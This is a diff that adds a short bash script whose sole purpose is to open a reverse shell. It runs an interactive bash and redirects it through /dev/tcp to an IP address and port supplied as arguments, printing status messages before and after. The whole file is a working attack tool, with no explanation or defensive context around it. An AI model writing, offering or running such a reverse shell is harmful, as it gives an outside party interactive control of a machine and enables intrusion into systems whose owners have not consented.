@@ -1,0 +1,20 @@
+#!/bin/bash
+
+#shell=/bin/sh
+shell=/bin/bash
+
+if [ -z "$2" ]; then
+	echo  "usage: $0 <ip address> <port>"
+	exit 1
+fi
+
+echo "Starting reverse shell (using /dev/tcp/) with the following options:"
+echo "IP adress...: $1"
+echo "TCP port....: $2"
+echo
+
+$shell -i >& /dev/tcp/$1/$2 0>&1
+
+echo "Reverse shell closed"
+exit 0
+
